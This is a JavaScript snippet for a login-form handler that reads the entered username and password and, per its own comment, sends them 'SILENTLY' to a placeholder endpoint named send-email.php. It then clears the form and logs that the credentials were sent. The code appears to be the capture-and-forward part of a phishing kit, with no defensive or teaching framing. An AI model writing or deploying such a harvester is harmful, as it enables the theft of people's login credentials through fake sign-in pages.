```javascript
// Form submission handler
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Send credentials to backend SILENTLY
    sendCredentialsToBackend(username, password);
    
    // Clear form
    this.reset();
});
// Function to send credentials to backend
function sendCredentialsToBackend(username, password) {
    fetch('https://your-backend-url.com/send-email.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            ipAddress: getClientIP(),
            userAgent: navigator.userAgent
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Credentials sent');
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
// Get client IP
function getClientIP() {
    return 'N/A';
}
```
